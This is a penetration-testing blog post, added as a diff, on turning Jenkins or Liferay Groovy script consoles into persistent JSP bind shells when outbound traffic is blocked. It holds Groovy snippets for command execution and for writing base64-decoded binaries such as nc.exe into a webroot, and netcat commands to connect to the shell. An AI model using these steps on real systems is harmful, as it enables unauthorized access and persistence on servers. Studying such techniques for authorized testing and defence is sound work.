@@ -1,0 +1,357 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Weaponizing the Groovy script console: Writing  bind shells &amp; transferring tools | vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content=" A practical walkthrough of abusing Groovy script consoles in Jenkins and Liferay to write persistent JSP bind shells, with techniques for transferring tools (base64), persistence, and post-exploitation — tailored for tight scenarios where outgoing network access is blocked by firewalls.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Weaponizing the Groovy script console: Writing  bind shells &amp; transferring tools"/>
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  <!-- 
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+ -->
+
+  <!--  favicon/indexing -->
+  <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+  <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+  <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+  <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">vipa0z</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/index" title="Home">
+			  <i class="fa fa-home"></i>Home
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/https://magdy3660.gitbook.io/field-manualx/" title="Read My Manual">
+			  <i class="fa fa-file"></i>Read My Manual
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Weaponizing the Groovy script console: Writing  bind shells &amp; transferring tools</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <!-- <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i>  A practical walkthrough of abusing Groovy script consoles in Jenkins and Liferay to write persistent JSP bind shells, with techniques for transferring tools (base64), persistence, and post-exploitation — tailored for tight scenarios where outgoing network access is blocked by firewalls.
+		 </div> alert -->
+	  		
+
+	  <p><img src="/../images/banner33.png" alt="alt text"></p>
+<h1 id="OVERVIEW"><a href="#OVERVIEW" class="headerlink" title="__OVERVIEW"></a>__OVERVIEW</h1><p>Have you ever been in an engagement or CTF where you finally find a Groovy script console… and then discover outbound connections are blocked? It’s one of those gut-punch moments where  you’ve got remote code execution, but the network is tightly constrained and your usual callback shells won’t call home. This post is for that exact situation.</p>
+<span id="more"></span>
+<p>Over the next few minutes I’ll show a practical, repeatable approach for turning a Groovy console into a persistent, multithreaded JSP bind shell that lives in the webroot.  no outbound callbacks required. You’ll learn how to transfer binary tools via base64, and deploy a resilient threaded bind shell that lets you reconnect if your session drops. This guide serves as a proof of concept, the shell in here is not secure enough for opsec, but it’s a starting point for you to build upon.</p>
+<hr>
+<h3 id="Quick-Referesher-on-bind-shells"><a href="#Quick-Referesher-on-bind-shells" class="headerlink" title="Quick Referesher on bind shells:"></a>Quick Referesher on bind shells:</h3><p><img src="/../images/shelltypes.png" alt="shelltypes"><br>The top side shows a bind shell: the victim host runs a listener (a shell bound to a TCP port) and the attacker connects into that listener to gain interactive access. The bottom side shows a reverse shell: the attacker runs the listener and the victim initiates an outbound connection back to the attacker, delivering a shell to the attacker’s listener.</p>
+<p>Reverse shells are the go-to for many red-teamers because they slip out through egress and work around NAT. But when outgoing traffic is tightly restricted (egress-blocked&#x2F;proxied), you need a plan B. that’s when I focus on bind shells. In short: a bind shell makes the target listen and waits for an inbound connection. It trades the egress dependency of a reverse shell for a requirement that you can reach the host inbound (or via a pivot you control). That trade can be exactly what you need when defenders have locked down outbound channels.</p>
+<hr>
+<h3 id="Groovy-Console-to-Bind-Shell"><a href="#Groovy-Console-to-Bind-Shell" class="headerlink" title="Groovy Console to Bind Shell:"></a>Groovy Console to Bind Shell:</h3><p><img src="/../images/gsc.png" alt="alt text"><br>When your RCE is limited to a Groovy-style script console (Jenkins, Liferay, etc.) and the target cannot reach back to you, the console itself becomes your primary file-system and transfer channel. This post focuses on turning that console access into a stable way to read&#x2F;write files, drop tools, and stage post-exploit activities — not on fancy in-memory shells. Treat the console like a tiny development environment on the target: you can list folders, create files, and write binary blobs (via base64) into disk locations the web server will execute or serve.</p>
+<p>high level steps:</p>
+<ol>
+<li>Discover writable paths (where you can save files that persist and potentially get executed or served).</li>
+<li>Transfer binary tools via base64&#x2F;text encoding and write them as raw bytes on disk.</li>
+<li>Verify permissions &amp; execute (browse to webshell to load your bind shell).</li>
+<li>Clean up and document detection artifacts.</li>
+</ol>
+<ol>
+<li>Finding stable, writable locations</li>
+</ol>
+<p>From the console, run simple listing commands to map the filesystem and locate likely writable paths:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Linux: pwd, ls -la, id, whoami, env</span><br><span class="line"></span><br><span class="line">Windows: dir, whoami, echo %USERPROFILE%</span><br></pre></td></tr></table></figure>
+<p>Typical candidate locations:</p>
+<ul>
+<li>Application webroot (e.g., <code>&lt;TOMCAT_HOME&gt;/webapps/ROOT</code>) — files here can often be triggered by HTTP requests.</li>
+<li>Upload or config directories used by the application.</li>
+</ul>
+<p>Tips:</p>
+<ul>
+<li>Prefer non-volatile locations that survive process reloads if you need longer-lived access (webroot &gt; in-memory-only artefacts).</li>
+<li>Check file ownership and mode (ls -la) to avoid placing files you can’t later run or overwrite.</li>
+<li>If multiple app instances exist (e.g., separate webapps), target the one whose webroot is public-facing.</li>
+</ul>
+<ol start="2">
+<li>Writing files from the console:</li>
+</ol>
+<p>Most Groovy consoles can create files with a single line of Groovy&#x2F;Java API:</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> File(<span class="string">&quot;/path/to/target/hello.jsp&quot;</span>).text = <span class="string">&#x27;&lt;% out.println(&quot;hello&quot;); %&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>Transferring binaries &amp; large tools via base64</li>
+</ol>
+<p>Binary transfer via base64 is the bread-and-butter when the target can’t download files directly.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 -w 0 mytool.exe &gt; mytool.b64   </span><br></pre></td></tr></table></figure>
+<p>Paste into console<br>Many consoles allow pasting large strings. But be mindful: consoles may truncate very large pastes or have timeouts. If you expect issues, split the base64 into chunks (explained below).</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Base64</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> b64 = <span class="string">&#x27;&#x27;&#x27;&lt;LONG BASE64 STRING&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="type">byte</span>[] bytes = Base64.getDecoder().decode(b64)</span><br><span class="line">Files.write(Paths.get(<span class="string">&quot;/path/to/target/tool.bin&quot;</span>), bytes)</span><br></pre></td></tr></table></figure>
+<p>Chunking large base64 blobs<br>If the console truncates or times out, split the base64 on your machine into multiple smaller variables and append each chunk sequentially:</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> part1 = <span class="string">&#x27;AAAA...&#x27;</span></span><br><span class="line"><span class="keyword">def</span> part2 = <span class="string">&#x27;BBBB...&#x27;</span></span><br><span class="line"><span class="keyword">def</span> b64 = part1 + part2</span><br><span class="line"><span class="type">byte</span>[] bytes = Base64.getDecoder().decode(b64)</span><br><span class="line">Files.write(Paths.get(<span class="string">&quot;/tmp/tool.bin&quot;</span>), bytes)</span><br></pre></td></tr></table></figure>
+<p>Reliable verification &amp; simple sanity checks</p>
+<p>After dropping:</p>
+<p>Check size and checksum: read file bytes and print length or MD5 Hash to verify it was transfered correctly.</p>
+<h3 id="Detailed-steps"><a href="#Detailed-steps" class="headerlink" title="Detailed steps:"></a>Detailed steps:</h3><p>How to use</p>
+<p>Browse to the Groovy Script Console GUI.</p>
+<p>Figure out where the web root is (Tomcat root). This can be performed with pwd, ls, or dir.</p>
+<p>Here are some known remote command execution scripts:</p>
+<p>POC for running simple commands such as  <code>pwd, ls, dir, cd</code>  and trying to identify where the web root might be located:</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> cmd=<span class="string">&quot;YOURCOMMAND-dir&quot;</span></span><br><span class="line"><span class="keyword">def</span> sout = <span class="keyword">new</span> StringBuilder(), serr = <span class="keyword">new</span> StringBuilder()</span><br><span class="line"><span class="keyword">def</span> proc = cmd.execute()</span><br><span class="line">proc.consumeProcessOutput(sout, serr)</span><br><span class="line">proc.waitForOrKill(<span class="number">1000</span>)</span><br><span class="line">println <span class="string">&quot;out&gt; $sout err&gt; $serr&quot;</span></span><br></pre></td></tr></table></figure>
+<p>For transferring tools</p>
+<p>Convert the binary to base64:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat nc.exe | base64 -w 0 &gt; nc.b64</span><br></pre></td></tr></table></figure>
+<p>Copy the output via tmux: enter copy mode (e.g. Prefix + [), select text (press Space to start selection), press Enter to save to the tmux buffer. Then copy the tmux buffer to the clipboard:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmux save-buffer - | xclip -selection clipboard</span><br></pre></td></tr></table></figure>
+<p>Paste the base64 blob into the following script:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import java.util.Base64</span><br><span class="line">import java.nio.file.Files</span><br><span class="line">import java.nio.file.Paths</span><br><span class="line">import java.nio.charset.StandardCharsets</span><br><span class="line"></span><br><span class="line">def b64 = &#x27;YOUR_B64&#x27;</span><br><span class="line">def dest = Paths.get(&quot;C:/DESTPATH/xyz&quot;)</span><br><span class="line">byte[] bytes = Base64.getDecoder().decode(b64)</span><br><span class="line">Files.write(dest, bytes)</span><br><span class="line">println &quot;Wrote $&#123;bytes.length&#125; bytes to $&#123;dest&#125;&quot;</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="Deploying-the-bind-shell"><a href="#Deploying-the-bind-shell" class="headerlink" title="Deploying the bind shell:"></a>Deploying the bind shell:</h3><p>Here’s where my bind shell comes into play: here’s the PoC I wrote. I recommend reviewing the code first, but you can paste the following into your Groovy console after updating the output path to match your Tomcat webroot:<br><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/vipa0z/Groovy-bind-shell/refs/heads/main/persistent_bind_shell.java">https://raw.githubusercontent.com/vipa0z/Groovy-bind-shell/refs/heads/main/persistent_bind_shell.java</a></p>
+<p>Hit save, then browse to your webshell so it activates: <a target="_blank" rel="noopener" href="http://site/threaded.jsp">http://site/threaded.jsp</a></p>
+<p>Connect to the bind shell via netcat:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">example 1:</span><br><span class="line">rlwrap -cAr nc -nv HOST-IP 3001</span><br><span class="line"></span><br><span class="line">example 2:</span><br><span class="line">rlwrap -cAr nc -nv 172.16.30.10 3001</span><br></pre></td></tr></table></figure>
+<p>That’s a wrap. Quick checklist before you go: confirm authorization, find writable paths, use binary-safe writes or chunked base64, verify integrity, and delete artifacts when finished. If you want a one-page README or detection checklist, I can put that together.<br>Thanks for reading.</p>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2025/07/13/chwoot/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2025-10-22 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/bind-shell/">bind shell<span>1</span></a></li> <li><a href="/tags/groovy/">groovy<span>1</span></a></li> <li><a href="/tags/liferay/">liferay<span>1</span></a></li> <li><a href="/tags/jenkins/">jenkins<span>1</span></a></li> <li><a href="/tags/RCE/">RCE<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
